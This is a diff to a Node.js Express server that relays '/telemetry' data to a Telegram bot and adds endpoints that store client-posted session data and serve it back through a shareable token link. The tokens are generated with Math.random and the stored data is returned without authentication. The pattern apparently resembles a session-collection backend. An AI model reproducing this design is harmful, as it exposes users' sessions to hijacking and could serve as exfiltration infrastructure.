@@ -5,8 +5,9 @@ const fetch = require('node-fetch');
 const app = express();
 const port = process.env.PORT || 3000;
 
-// Middleware to parse URL-encoded data
+// Middleware to parse URL-encoded and JSON data
 app.use(bodyParser.urlencoded({ extended: true }));
+app.use(bodyParser.json());
 
 // Telegram Configuration
 const botToken = process.env.BOT_TOKEN || 'YOUR_BOT_TOKEN'; // Replace with your bot token
@@ -41,7 +42,32 @@ async function sendTelegramMessage(message) {
     }
 }
 
-// Endpoint to handle incoming data
+// Store session data in memory (replace with a database in production)
+const sessions = {};
+
+// Endpoint to generate a shareable token
+app.post('/generate-token', (req, res) => {
+    const sessionData = req.body; // Session data from the client
+    const token = Math.random().toString(36).substring(2, 15); // Generate a random token
+    sessions[token] = sessionData; // Store session data
+
+    const shareableLink = `https://test-em43.onrender.com/share?token=${token}`; // Shareable link
+    res.status(200).json({ token, shareableLink });
+});
+
+// Endpoint to retrieve session data using a token
+app.get('/share', (req, res) => {
+    const token = req.query.token;
+    const sessionData = sessions[token];
+
+    if (sessionData) {
+        res.status(200).json(sessionData); // Return session data
+    } else {
+        res.status(404).send('Invalid or expired token');
+    }
+});
+
+// Endpoint to handle incoming data (for Telegram notifications)
 app.post('/telemetry', async (req, res) => {
     try {
         const {
